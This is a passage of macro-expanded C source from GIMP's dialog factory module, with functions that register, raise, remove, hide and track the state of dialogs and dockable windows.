*factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return factory -> p -> context;\n}\n\nGimpMenuFactory *gimp_dialog_factory_get_menu_factory(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return factory -> p -> menu_factory;\n}\n\nGList *gimp_dialog_factory_get_open_dialogs(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return factory -> p -> open_dialogs;\n}\n\nGList *gimp_dialog_factory_get_session_infos(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return factory -> p -> session_infos;\n}\n\nvoid gimp_dialog_factory_add_session_info(GimpDialogFactory *factory,GimpSessionInfo *info)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)info;\n      GType __t = gimp_session_info_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_SESSION_INFO (info)\");\n      return ;\n    }\n    ;\n  }while (0);\n/* We want to append rather than prepend so that the serialized\n   * order in sessionrc remains the same\n   */\n  factory -> p -> session_infos = g_list_append(factory -> p -> session_infos,g_object_ref(info));\n}\n/**\n * gimp_dialog_factory_dialog_raise:\n * @factory:      a #GimpDialogFactory\n * @screen:       the #GdkScreen the dialog should appear on\n * @identifiers:  a '|' separated list of identifiers of dialogs as\n *                registered with gimp_dialog_factory_register_entry()\n * @view_size:    the initial preview size if a dialog needs to be created\n *\n * Raises any of a list of already existing toplevel dialog or\n * #GimpDockable if it was already created by this %facory.\n *\n * Implicitly creates the first dialog in the list if none of the dialogs\n * were found.\n *\n * Return value: the raised or newly created dialog.\n **/\n\nGtkWidget *gimp_dialog_factory_dialog_raise(GimpDialogFactory *factory,GdkScreen *screen,const gchar *identifiers,gint view_size)\n{\n  GtkWidget *dialog;\n  gchar **ids;\n  gint i;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)screen;\n      GType __t = gdk_screen_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GDK_IS_SCREEN (screen)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifiers != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifiers != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n/*  If the identifier is a list, try to find a matching dialog and\n   *  raise it. If there's no match, use the first list item.\n   *\n   *  (we split the identifier list manually here because we must pass\n   *  a single identifier, not a list, to new_internal() below)\n   */\n  ids = g_strsplit(identifiers,\"|\",0);\n  for (i = 0; ids[i]; i++) {\n    if (gimp_dialog_factory_find_widget(factory,ids[i])) {\n      break; \n    }\n  }\n  dialog = gimp_dialog_factory_dialog_new_internal(factory,screen,((void *)0),((void *)0),((ids[i]?ids[i] : ids[0])),view_size,!0,!0,!0);\n/*return_existing*/\n/*present*/\n/*create_containers*/\n  g_strfreev(ids);\n  return dialog;\n}\n/**\n * gimp_dialog_factory_dockable_new:\n * @factory:      a #GimpDialogFactory\n * @dock:         a #GimpDock crated by this %factory.\n * @identifier:   the identifier of the dialog as registered with\n *                gimp_dialog_factory_register_entry()\n * @view_size:\n *\n * Creates a new #GimpDockable in the context of the #GimpDock it will be\n * added to.\n *\n * Implicitly raises & returns an already existing singleton dockable,\n * so callers should check that gimp_dockable_get_dockbook (dockable)\n * is NULL before trying to add it to it's #GimpDockbook.\n *\n * Return value: the newly created #GimpDockable or an already existing\n *               singleton dockable.\n **/\n\nGtkWidget *gimp_dialog_factory_dockable_new(GimpDialogFactory *factory,GimpDock *dock,const gchar *identifier,gint view_size)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dock;\n      GType __t = gimp_dock_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DOCK (dock)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return gimp_dialog_factory_dialog_new_internal(factory,gtk_widget_get_screen(((GtkWidget *)(g_type_check_instance_cast(((GTypeInstance *)dock),gtk_widget_get_type())))),gimp_dock_get_context(dock),gimp_dock_get_ui_manager(dock),identifier,view_size,0,0,0);\n/*return_existing*/\n/*present*/\n/*create_containers*/\n}\n\nvoid gimp_dialog_factory_add_dialog(GimpDialogFactory *factory,GtkWidget *dialog)\n{\n  GimpDialogFactory *dialog_factory = ((void *)0);\n  GimpDialogFactoryEntry *entry = ((void *)0);\n  GimpSessionInfo *info = ((void *)0);\n  GList *list = ((void *)0);\n  gboolean toplevel = 0;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (g_list_find(factory -> p -> open_dialogs,dialog)) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog already registered\",((const char *)__func__));\n    return ;\n  }\n  dialog_factory = gimp_dialog_factory_from_widget(dialog,&entry);\n  if (!gimp_dialog_factory_dialog_sane(factory,dialog_factory,entry,dialog)) {\n    return ;\n  }\n  toplevel = gtk_widget_is_toplevel(dialog);\n  if (entry) {\n/* dialog is a toplevel (but not a GimpDockWindow) or a GimpDockable */\n    do {\n      if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n        gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),888,\"adding %s \\\"%s\\\"\",(toplevel?\"toplevel\" : \"dockable\"),entry -> identifier);\n      }\n    }while (0);\n    for (list = factory -> p -> session_infos; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n      GimpSessionInfo *current_info = (list -> data);\n      if (gimp_session_info_get_factory_entry(current_info) == entry) {\n        if (gimp_session_info_get_widget(current_info)) {\n          if (gimp_session_info_is_singleton(current_info)) {\n            g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: singleton dialog \\\"%s\\\" created twice\",((const char *)__func__),entry -> identifier);\n            do {\n              if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n                gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),906,\"corrupt session info: %p (widget %p)\",current_info,gimp_session_info_get_widget(current_info));\n              }\n            }while (0);\n            return ;\n          }\n          continue; \n        }\n        gimp_session_info_set_widget(current_info,dialog);\n        do {\n          if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n            gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),921,\"updating session info %p (widget %p) for %s \\\"%s\\\"\",current_info,gimp_session_info_get_widget(current_info),(toplevel?\"toplevel\" : \"dockable\"),entry -> identifier);\n          }\n        }while (0);\n        if (toplevel && gimp_session_info_is_session_managed(current_info) && !gtk_widget_get_visible(dialog)) {\n          gimp_session_info_apply_geometry(current_info);\n        }\n        info = current_info;\n        break; \n      }\n    }\n    if (!info) {\n      info = gimp_session_info_new();\n      gimp_session_info_set_widget(info,dialog);\n      do {\n        if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n          gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),946,\"creating session info %p (widget %p) for %s \\\"%s\\\"\",info,gimp_session_info_get_widget(info),(toplevel?\"toplevel\" : \"dockable\"),entry -> identifier);\n        }\n      }while (0);\n      gimp_session_info_set_factory_entry(info,entry);\n      if (gimp_session_info_is_session_managed(info)) {\n/* Make the dialog show up at the user position the\n               * first time it is shown. After it has been shown the\n               * first time we don't want it to show at the mouse the\n               * next time. Think of the use cases \"hide and show with\n               * tab\" and \"change virtual desktops\"\n               */\n        do {\n          if (gimp_log_flags & GIMP_LOG_WM) {\n            gimp_log(GIMP_LOG_WM,((const char *)__func__),959,\"setting GTK_WIN_POS_MOUSE for %p (\\\"%s\\\")\\n\",dialog,entry -> identifier);\n          }\n        }while (0);\n        gtk_window_set_position(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))),GTK_WIN_POS_MOUSE);\n        g_signal_connect_data(dialog,\"configure-event\",((GCallback )gimp_dialog_factory_set_user_pos),((void *)0),((void *)0),(0));\n      }\n      gimp_dialog_factory_add_session_info(factory,info);\n      g_object_unref(info);\n    }\n  }\n/* Some special logic for dock windows */\n  if (({\n    GTypeInstance *__inst = (GTypeInstance *)dialog;\n    GType __t = gimp_dock_window_get_type();\n    gboolean __r;\n    if (!__inst) {\n      __r = 0;\n    }\n    else {\n      if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n        __r = !0;\n      }\n      else {\n        __r = g_type_check_instance_is_a(__inst,__t);\n      }\n    }\n    __r;\n  })) \n{\n    g_signal_emit(factory,factory_signals[DOCK_WINDOW_ADDED],0,dialog);\n  }\n  factory -> p -> open_dialogs = g_list_prepend(factory -> p -> open_dialogs,dialog);\n  g_signal_connect_object(dialog,\"destroy\",((GCallback )gimp_dialog_factory_remove_dialog),factory,G_CONNECT_SWAPPED);\n  if (gimp_session_info_is_session_managed(info)) {\n    g_signal_connect_object(dialog,\"configure-event\",((GCallback )gimp_dialog_factory_dialog_configure),factory,(0));\n  }\n}\n\nvoid gimp_dialog_factory_add_foreign(GimpDialogFactory *factory,const gchar *identifier,GtkWidget *dialog)\n{\n  GimpDialogFactory *dialog_factory;\n  GimpDialogFactoryEntry *entry;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (gtk_widget_is_toplevel(dialog)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"gtk_widget_is_toplevel (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  dialog_factory = gimp_dialog_factory_from_widget(dialog,&entry);\n  if (dialog_factory || entry) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog was created by a GimpDialogFactory\",((const char *)__func__));\n    return ;\n  }\n  entry = gimp_dialog_factory_find_entry(factory,identifier);\n  if (!entry) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: no entry registered for \\\"%s\\\"\",((const char *)__func__),identifier);\n    return ;\n  }\n  if (entry -> new_func) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: entry for \\\"%s\\\" has a constructor (is not foreign)\",((const char *)__func__),identifier);\n    return ;\n  }\n  gimp_dialog_factory_set_widget_data(dialog,factory,entry);\n  gimp_dialog_factory_add_dialog(factory,dialog);\n}\n\nvoid gimp_dialog_factory_remove_dialog(GimpDialogFactory *factory,GtkWidget *dialog)\n{\n  GimpDialogFactory *dialog_factory;\n  GimpDialogFactoryEntry *entry;\n  GList *list;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (!g_list_find(factory -> p -> open_dialogs,dialog)) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog not registered\",((const char *)__func__));\n    return ;\n  }\n  factory -> p -> open_dialogs = g_list_remove(factory -> p -> open_dialogs,dialog);\n  dialog_factory = gimp_dialog_factory_from_widget(dialog,&entry);\n  if (!gimp_dialog_factory_dialog_sane(factory,dialog_factory,entry,dialog)) {\n    return ;\n  }\n  do {\n    if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n      gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),1064,\"removing \\\"%s\\\" (dialog = %p)\",entry -> identifier,dialog);\n    }\n  }while (0);\n  for (list = factory -> p -> session_infos; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpSessionInfo *session_info = (list -> data);\n    if (gimp_session_info_get_widget(session_info) == dialog) {\n      do {\n        if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n          gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),1075,\"clearing session info %p (widget %p) for \\\"%s\\\"\",session_info,gimp_session_info_get_widget(session_info),entry -> identifier);\n        }\n      }while (0);\n      gimp_session_info_set_widget(session_info,((void *)0));\n      gimp_dialog_factory_unset_widget_data(dialog);\n      g_signal_handlers_disconnect_matched(dialog,(24),0,0,((void *)0),gimp_dialog_factory_set_user_pos,((void *)0));\n      g_signal_handlers_disconnect_matched(dialog,(24),0,0,((void *)0),gimp_dialog_factory_remove_dialog,factory);\n      if (gimp_session_info_is_session_managed(session_info)) {\n        g_signal_handlers_disconnect_matched(dialog,(24),0,0,((void *)0),gimp_dialog_factory_dialog_configure,factory);\n      }\n      if (({\n        GTypeInstance *__inst = (GTypeInstance *)dialog;\n        GType __t = gimp_dock_window_get_type();\n        gboolean __r;\n        if (!__inst) {\n          __r = 0;\n        }\n        else {\n          if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n            __r = !0;\n          }\n          else {\n            __r = g_type_check_instance_is_a(__inst,__t);\n          }\n        }\n        __r;\n      })) \n{\n/*  don't save session info for empty docks  */\n        factory -> p -> session_infos = g_list_remove(factory -> p -> session_infos,session_info);\n        g_object_unref(session_info);\n        g_signal_emit(factory,factory_signals[DOCK_WINDOW_REMOVED],0,dialog);\n      }\n      break; \n    }\n  }\n}\n\nvoid gimp_dialog_factory_hide_dialog(GtkWidget *dialog)\n{\n  GimpDialogFactory *factory = ((void *)0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (gtk_widget_is_toplevel(dialog)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"gtk_widget_is_toplevel (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (!(factory = gimp_dialog_factory_from_widget(dialog,((void *)0)))) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog was not created by a GimpDialogFactory\",((const char *)__func__));\n    return ;\n  }\n  gtk_widget_hide(dialog);\n  if ((factory -> p -> dialog_state) != GIMP_DIALOGS_SHOWN) {\n    g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),\"gimp-dialog-visibility\",((gpointer )((glong )GIMP_DIALOG_VISIBILITY_INVISIBLE)));\n  }\n}\n\nvoid gimp_dialog_factory_set_state(GimpDialogFactory *factory,GimpDialogsState state)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  factory -> p -> dialog_state = state;\n  if (state == GIMP_DIALOGS_SHOWN) {\n    gimp_dialog_factory_show(factory);\n  }\n  else {\n    gimp_dialog_factory_hide(factory);\n  }\n}\n\nGimpDialogsState gimp_dialog_factory_get_state(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return GIMP_DIALOGS_SHOWN;\n    }\n    ;\n  }while (0);\n  return factory -> p -> dialog_state;\n}\n\nvoid gimp_dialog_factory_show_with_display(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if ((factory -> p -> dialog_state) == GIMP_DIALOGS_HIDDEN_WITH_DISPLAY) {\n    gimp_dialog_factory_set_state(factory,GIMP_DIALOGS_SHOWN);\n  }\n}\n\nvoid gimp_dialog_factory_hide_with_display(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if ((factory -> p -> dialog_state) == GIMP_DIALOGS_SHOWN) {\n    gimp_dialog_factory_set_state(factory,GIMP_DIALOGS_HIDDEN_WITH_DISPLAY);\n  }\n}\nstatic GQuark gimp_dialog_factory_key = 0;\nstatic GQuark gimp_dialog_factory_entry_key = 0;\n\nGimpDialogFactory *gimp_dialog_factory_from_widget(GtkWidget *dialog,GimpDialogFactoryEntry **entry)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  if (!gimp_dialog_factory_key) {\n    gimp_dialog_factory_key = g_quark_from_static_string(\"gimp-dialog-factory\");\n    gimp_dialog_factory_entry_key = g_quark_from_static_string(\"gimp-dialog-factory-entry\");\n  }\n  if (entry) {\n     *entry = (g_object_get_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_entry_key));\n  }\n  return (g_object_get_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_key));\n}\n#define GIMP_DIALOG_FACTORY_MIN_SIZE_KEY \"gimp-dialog-factory-min-size\"\n\nvoid gimp_dialog_factory_set_has_min_size(GtkWindow *window,gboolean has_min_size)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)window;\n      GType __t = gtk_window_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WINDOW (window)\");\n      return ;\n    }\n    ;\n  }while (0);\n  g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)window),((GType )(20 << 2))))),\"gimp-dialog-factory-min-size\",((gpointer )((glong )(has_min_size?!0 : 0))));\n}\n\ngboolean gimp_dialog_factory_get_has_min_size(GtkWindow *window)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)window;\n      GType __t = gtk_window_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WINDOW (window)\");\n      return 0;\n    }\n    ;\n  }while (0);\n  return (gint )((glong )(g_object_get_data(((GObject 